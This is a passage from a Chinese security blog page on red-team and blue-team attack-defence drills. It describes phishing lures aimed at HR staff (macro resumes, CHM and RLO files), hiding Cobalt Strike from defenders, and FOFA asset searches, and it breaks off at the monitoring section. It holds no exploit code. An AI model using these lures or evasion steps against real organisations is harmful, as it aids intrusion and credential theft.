<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>红队蓝队hvv | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="红队蓝队hvv"><meta name="application-name" content="红队蓝队hvv"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="红队蓝队hvv"><meta property="og:url" content="http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="钓鱼​    疫情期间，当时给一家公司做钓鱼，使用钓鱼，伪造一些回家需要离京的报备的OA系统或者附件，受害者使用账号凭据来登录账号，当时发送了五十积分邮件，持续了1天时间，目的就是为了看一下大家的安全意识是否达到了培训标准，当时有10几份邮件被打开，有7个人使用了账号密码登录，拿到了用户凭证，成功的"><meta property="og:locale" content="zh-cn"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="John Doe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="钓鱼​    疫情期间，当时给一家公司做钓鱼，使用钓鱼，伪造一些回家需要离京的报备的OA系统或者附件，受害者使用账号凭据来登录账号，当时发送了五十积分邮件，持续了1天时间，目的就是为了看一下大家的安全意识是否达到了培训标准，当时有10几份邮件被打开，有7个人使用了账号密码登录，拿到了用户凭证，成功的"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: John Doe","link":"链接: ","source":"来源: Hexo","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Hexo',
  title: '红队蓝队hvv',
  postAI: '',
  pageFillDescription: '钓鱼, 外网打点, 蓝队, 认识监控（做什么）, AWVS特征, Appscan、Nessus, 僵尸网络MOZI, 监控方法（怎么做）, 如何分析是否为工具攻击, 常见的工具特征, 漏洞工具识别, 重点注意木马, 分析思路（为什么）, 内网横向, 内网信息收集, 入口点信息收集, 查看网络配置, 查看网络连接, 查看登录日志, Linux, Windows, 杀毒软件信息收集, Windows查看杀毒软件的方法, 收集密码信息, 利用mimikatz获取用户密码, 利用收集到的密码hash 检测同网段是否有相同密码的主机, 利用nbtscan对135端口做域探测, 对收集到的网段进行端口漏洞扫描, 代理转发, 正向代理, socks协议, 常见的转发工具及不同平台的代理链工具, 反向代理, 横向扩点, Windows认证分类, 本地认证, 远程主机进行NTLM认证, 认证详细流程, 横向移动攻击, 如何进行横向移动攻击, 无凭证情况, 有凭证情况, RDP 协议, RDP 常规连接, 通过 Linux 系统创建 RDP 连接, 通过.rdp文件创建连接, SMB 协议x2FCIFS 协议, 为什么使用smb, SSH 协议, WinRM（Windows Remote Managerment）, WinRM 可以做什么, Pass The Hash（PTH）, 不同的 PTH 思路, 域渗透, 域渗透前置知识, 什么是域, 什么是域控制器, 什么是活动目录, 什么是SAM, kerberos 认证, 域环境的PTH攻击–PTT, 黄金票据, 制作金票的条件, 实战, 白银票据, 制作银票的条件, 利用过程, 黄金票据与白银票据的区别, 传统甲方HVV准备, 资产梳理, 面临的问题, 解决思路, 资产问题排查, 基线检查, Lol基础扫描, 溯源备份, 责任划分, 解决难点, 应急预案, 历史漏洞应急预案, 1day或nday攻击预案, 解决难点钓鱼疫情期间当时给一家公司做钓鱼使用钓鱼伪造一些回家需要离京的报备的系统或者附件受害者使用账号凭据来登录账号当时发送了五十积分邮件持续了天时间目的就是为了看一下大家的安全意识是否达到了培训标准当时有几份邮件被打开有个人使用了账号密码登录拿到了用户凭证成功的钓鱼钓鱼手段使用宏病毒一个帮助文档是形式来让他点击我们这个附件让受害者点击这个文件或者点击可以运行的文件达到使他主机上线或者拿到它的账号凭据话术使用钓鱼安全演练这个通告装作以安全部门的身份我们要做一次钓鱼的安全演练使大家提高警惕下面附带一份附件的一个病毒或者宏病毒需要打开文件查看里面的详细内容钓鱼附件内容薪资调整放假通知发票业务钓鱼要注意针对部门的特殊人员简历投递人力资源部商务合作销售的电脑公司平台升级技术交流技术部门钓鱼是我们首选的的安全意在一个企业中相对较低而且有相对应的在遇到非常契合的简历时更容易放下戒备因为电脑一般能出网因为需要在外网上发布招聘消息我们准备一些简历然后使用高斯模糊技术模糊背景在前景中使用如果的图片覆盖诱导点击启动宏内容宏是默认关闭的在中如果不启用宏的话它里面的程序是不会执行的所以就必须还得诱导一些安全意识比较薄弱的人去启用宏技术配合宏技术执行其中的恶意代码获取其权限常用钓鱼手段宏自解压自解压文件已编译的帮助文件利用作源码把帮助内容存储在其中制作需要用到第三方软件如制作首选需要创建一个文件夹在文件里创建俩个文件和一个文件在两个文件夹内部再各创建一个文件外网打点拿到一个外网的入口点进行内网的横向或者域渗透如何拿到一个外网点隐匿攻击代理使用代理隐藏自己的真实同时同地市的能再一定程序减少告警信息减少登录等操作时产生的异地登录告警无痕使用浏览器时开启无痕模式能够最大程度的避免被蜜罐捕获个人敏感信息隐匿选中中中和选项特征隐藏隐藏特征防止被蓝队溯源反制修改默认端口默认修改默认证书使用等技术隐藏真实修改文件域名收集备案反查小程序公众号证书敏感资产已知的系统漏洞利用漏洞空间搜索引擎从标题中搜索例标题中有北京的网站从头中搜索例服务器从正文中搜索例正文包含搜索根域名带有的网站例根域名是的网站从中搜索注意搜索要用作为名称查找对应端口的资产例查找对应端口的资产从中搜索包含的网站注意搜索要用作为名称搜索制定协议类型在开启端口扫描的情况下有效例查询协议资产搜索指定城市的资产例搜索指定城市的资产搜索指定行政区的资产例搜索指定行政区的资产搜索指定国家编码的资产例搜索指定国家编码的资产搜索证书或者等中带有的资产搜索使用此的资产蓝队认识监控做什么网络监控通过流量探针检查服务器间传递的流量大多关注外网流量通过流量监控的报警来返现问题特征僵尸网络主机监控通过服务器上安装的监控主机行为以检测木马外联为主通过主机监控报警来发现问题监控方法怎么做如何分析是否为工具攻击常见的工具特征漏洞工具识别重点注意木马分析思路为什么分析的方法论访问时间频率非业务时段单大量请求不同间请求存在关联的恶意内容嫌疑等情况都是可疑的访问业务路径响应内容不常见的访问路径不符合业务正常响应的内容等情况是可疑的访问请求特征参数具有明显的攻击特征的参数可确认为攻击者内网横向内网信息收集入口点信息收集查看网络配置查看网络连接查看网络连接通常可以通过这条命令判断管理员网段数据库服务器在刚进入内网时间判断下一步横向扩展的方向查看登录日志查看最近十条登录日志管理员从哪条机器过来的杀毒软件信息收集所有渗透测试都需要保证在没有杀毒软件或者确保杀毒软件不会对你的行为有影响的前提下进行所以我们通常需要在渗透测试的前期掌握杀入软件信息查看杀毒软件的方法从服务中查看是否存在杀毒软件的服务从进程中查看是否存在杀软的进程这个需要熟知常见的杀毒软件的进程名如果不知道可以放到识别网站进行识别收集密码信息包括数据库账号密码本地管理员账号密码内存中保存的用户密码目录下面查看是否存私钥利用获取用户密码获取内存中的密码获取本地用户的密码利用收集到的密码检测同网段是否有相同密码的主机利用对端口做域探测这个工具可以快速的找到带有域主机可以找到下一步渗透的方向毕竟域才最能是获取更多权限的是一个用户扫描网络以获取名称程序信息他向每个地址发送状态查询提供的范围和列表接收到的人类信息可读形式对于每个响应的主机它都会列出地址计算机名称登录用户名和地址对收集到的网段进行端口漏洞扫描一款内网综合扫描工具流量大特征明显方便一键自动化全方位漏洞扫描支持主机存活探测端口扫描常见服务的爆破批量写公钥计划任务反弹读取网卡信息指纹识别漏洞扫描探测域控识别等功能跳过存活检测不保存文件跳过扫描写公钥计划任务反弹爆破成功后命令执行指定模块和端口加载指定文件的用户名密码来进行爆破指定扫描结果保存路径默认保存在当前路径段的和方便快速查看网段信息密码碰撞指定模块以文件导入扫描单个并设置代理不进行爆破不扫以减少流量在原基础上加上扫描密码碰撞使用方法代理转发正向代理中和同属一个区域对是透明的反向代理中和同属一个区域对透明共同特点代替收发请求和响应正向代理使用情况在目标不出网并且有环境的时候使用工具上传一个脚本工具正向连接过去协议常见的转发工具及不同平台的代理链工具反向代理目标网络边界不存在公网需要通过反弹方式创建代理使用场景普通网络环境目标网络边界存在公网且可任意开监听端口在主机上通过这个命令开启端口的代理可通过访问端口使用主机提供的代理目标网络边界不存在公网需要通过反弹方式创建代理一台可控公网主机可控内网主机防火墙在的公网主机添加转接隧道将收到的代理请求转交给反连端口的主机将目标网络的可控边界主机反向连接公网主机可通过访问端口使用主机提供的代理服务横向扩点认证分类本地认证工作组远程认证域环境认证本地认证远程主机进行认证认证详细流程横向移动攻击横向移动攻击的目的横向移动攻击通常发生在攻击者获取基本的立足点之后为了能够获取更加有价值的资产目标而进行横向移动横向移动攻击发生的前提条件先前准备为资产发现与凭证窃取即内网信息收集如何进行横向移动攻击如何防御与检测横向移动攻击如何进行横向移动攻击本地提到的横向移动攻击我们粗略分为三类无凭证有凭证文件下载注本次分析重点为有凭证情况默认已知受害机凭证无凭证情况为漏洞利用通常有较明显行为特征将文件下载也作为横向移动攻击部分无凭证情况若无目标系统凭证即需要利用漏洞进行攻击该类攻击通常有较为明显的行为特征常用漏洞例如未授权各类应用程序与协议漏洞下面为无凭证情况下可以基于当前信息尝试的攻击举例有凭证情况在拥有凭证的情况下我们可以使自己的行为与常规运维有较高的相似性下面会先说明协议的常规实现再进协议利用最后进行协议检测再次说明默认已经获取目标系统登录凭证协议协议协议协议常规连接一定要在确保管理员不在线的情况下登录否则会把他挤下线通过图形化的方式进行连接流量数据进行了加密注当前认为协议是不安全的通过哈希碰撞可能得到解密内容也可以直接通过秘钥解密常规连接行为特点具有图形化界面连接时长较长进行复杂操作连接目标相对固定通过系统创建连接工具通过文件创建连接协议协议为什么使用默认开放默认允许出入站防火墙不阻拦不需要高权限可以实现信息回传已知用户名密码如何使用协议建立连接协议可以做什么不同的思路模块的思路是通过修改内存的方法将当前用户存储于中的凭证替换为攻击者凭证实现通过对上层协议的重新实现更改认证流程直接将攻击者凭证用于认证的方式实现域渗透域渗透前置知识什么是域什么是域控制器什么是活动目录什么是认证请求发起用户级服务提供机域控管理机又称密钥分发中心账户数据库存储域内用户认证服务票据授予服务域环境的攻击黄金票据制作金票的条件域名称域的值域的账户密码伪造用户名可以是任意的实战白银票据制作银票的条件域名称域的值可利用的服务伪造的用户名可以是任意用户名服务账号的利用过程黄金票据与白银票据的区别访问权限不同伪造可以获取任何服务权限伪造只能访问指定的服务加密方式不同由的加密由服务器端密码的值加密认证流程不同的利用过程需要访问域控可以直接跳过直接访问对应的服务器传统甲方准备资产梳理域名资产资产服务器业务服务器负载均衡防护设备主机硬件设施面临的问题资产分布不均无法全部梳理解决思路公开收集内部整理运维部门进行协助扫描资产问题排查基线检查针对已整理的对外服务资产进行基线检查需符合上级或部门要求基础扫描针对已整理的资产进行第一遍基础扫描包括存活端口服务漏洞主机漏洞以及漏洞溯源备份要求对外提供服务的资产务必开启系统日志日志以及有必要保存的日志责任划分资产由专业部门进行负责安全团队辅助对接解决难点域名过多解析主机随时变更服务器服务版本过低升级难度大主机漏洞原理异常排查困难大量无人认领服务器但是业务中需要使用搭建大量历史测试系统应急预案历史漏洞应急预案或攻击预案解决难点应急需要安全相关人员处理历史漏洞排查不全面',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-15 16:09:21',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">红队蓝队hvv</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-04-15T08:08:31.549Z" title="发表于 2024-04-15 16:08:31">2024-04-15</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-15T08:09:21.722Z" title="更新于 2024-04-15 16:09:21">2024-04-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/04/15/%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F/"><header><h1 id="CrawlerTitle" itemprop="name headline">红队蓝队hvv</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">John Doe</span><time itemprop="dateCreated datePublished" datetime="2024-04-15T08:08:31.549Z" title="发表于 2024-04-15 16:08:31">2024-04-15</time><time itemprop="dateCreated datePublished" datetime="2024-04-15T08:09:21.722Z" title="更新于 2024-04-15 16:09:21">2024-04-15</time></header><h1 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h1><p>​    疫情期间，当时给一家公司做钓鱼，使用钓鱼，伪造一些回家需要离京的报备的OA系统或者附件，受害者使用账号凭据来登录账号，当时发送了五十积分邮件，持续了1天时间，目的就是为了看一下大家的安全意识是否达到了培训标准，当时有10几份邮件被打开，有7个人使用了账号密码登录，拿到了用户凭证，成功的钓鱼<br>​    钓鱼手段：使用宏病毒、chm一个帮助文档是形式来让他点击我们这个附件，让受害者点击这个文件或者点击可以运行的文件，达到使他主机上线或者拿到它的账号凭据</p>
<pre><code>话术：使用钓鱼安全演练这个通告，装作以安全部门的身份，我们要做一次钓鱼的安全演练，使大家提高警惕，下面附带一份附件、chm的一个病毒或者word宏病毒，需要打开文件，查看里面的详细内容
</code></pre>
<p>​    钓鱼附件内容：薪资调整、放假通知、发票业务</p>
<p>​    钓鱼要注意：针对部门的特殊人员，简历投递（人力资源部、HR）、商务合作（销售的电脑）、公司平台升级、技术交流（技术部门）</p>
<p>​    HR钓鱼是我们首选的，HR的安全意在一个企业中，相对较低，而且HR有相对应的KPI，在遇到非常契合的简历时，更容易放下戒备，因为HR电脑一般能出网，因为HR需要在外网上发布招聘消息<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们准备一些简历，然后使用高斯模糊技术，模糊背景，在前景中，使用如果的图片覆盖，诱导HR点击启动宏内容(宏是默认关闭的)，在word中如果不启用宏的话，它里面的VB程序是不会执行的，所以就必须还得诱导一些安全意识比较薄弱的人去启用宏技术，配合Word宏技术，执行其中的恶意代码，获取其pc权限</span><br></pre></td></tr></table></figure></p>
<p>常用钓鱼手段：Word宏、自解压———RLO、自解压、INK文件、RLO、HTA、CHM</p>
<p>CHM，已编译的帮助文件，利用HTML作源码，把帮助内容存储在其中<br>制作CHM需要用到第三方软件，如：EasyCHM<br>制作CHM首选需要创建一个文件夹，在文件里创建俩个文件和一个index.html文件，在两个文件夹内部再各创建一个index.html文件</p>
<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>拿到一个外网的入口点，进行内网的横向或者域渗透<br>如何拿到一个外网点<br>    隐匿攻击	<br>        代理	使用代理，隐藏自己的真实IP，同时同地市的IP能再一定程序减少告警信息<br>            减少SSH、RDP登录等操作时，产生的异地登录告警<br>        无痕	使用浏览器时，开启无痕模式，能够最大程度的避免被蜜罐捕获个人敏感信息<br>        burp	burp隐匿<br>            选中proxy中，Miscellaneous中，DIsable web interface at <a target="_blank" rel="noopener" href="http://burpsuite和suppress/">http://burpsuite和Suppress</a> Burp error messages in browser选项<br>        cobaltstrike特征隐藏	隐藏cobaltstrike特征，防止被蓝队溯源、反制<br>            修改默认端口，默认50050<br>            修改默认证书<br>            使用CDN等技术隐藏真实IP<br>            修改Malleable文件<br>    域名收集<br>        ICP备案<br>        IP反查<br>        App、小程序、公众号<br>        证书<br>    敏感资产<br>        已知的系统漏洞，利用漏洞<br>    空间搜索引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FOFA</span><br><span class="line">			title=&quot;abc&quot;			#从标题中搜索 abc.例:标题中有北京的网站</span><br><span class="line">			header=&quot;abc&quot;		#从 http 头中搜索abc.例:jboss服务器.</span><br><span class="line">			body=&quot;abc&quot;			#从 html 正文中搜索abc.例:正文包含Hacked by.</span><br><span class="line">			domain=“qq.com&quot;		#搜索根域名带有q9.com的网站.例: 根域名是q9.com的网站</span><br><span class="line">			host=&quot;·gov.cn&quot;		#从 url 中搜索.gov.cn,注意搜索要用host作为名称.</span><br><span class="line">			port=&quot;443&quot;			#查找对应 443 端口的资产,例: 查找对应443端口的资产</span><br><span class="line">			ip=&quot;1.1.1.1&quot;		#从ip中搜索包含 1.1.1.1的网站,注意搜索要用ip作为名称.</span><br><span class="line">			protocol=&quot;https&quot;	#搜索制定协议类型(在开启端口扫描的情况下有效):例:查询https协议资产</span><br><span class="line">			city=&quot;Beijing&quot;		#搜索指定城市的资产.例:搜索指定城市的资产</span><br><span class="line">			region=&quot;Zhejiang&quot;	#搜索指定行政区的资产.例: 搜索指定行政区的资产</span><br><span class="line">			country=&quot;CN&quot;		#搜索指定国家(编码)的资产,例: 搜索指定国家(编码)的资产</span><br><span class="line">			cert=&quot;google.com”	#搜索证书(https或者imaps等)中带有google.com的资产</span><br><span class="line">			icon hash=&quot;-xxxx&quot;	#搜索使用此icon的资产		</span><br></pre></td></tr></table></figure>

<p>​	<a target="_blank" rel="noopener" href="https://github.com/xiecat/fofax">FOFAX</a></p>
<h1 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h1><h2 id="认识监控（做什么）"><a href="#认识监控（做什么）" class="headerlink" title="认识监控（做什么）"></a>认识监控（做什么）</h2><p>​	网络监控<br>​		通过流量探针，检查服务器间传递的流量（大多关注外网流量），通过流量监控的报警来返现问题</p>
<blockquote>
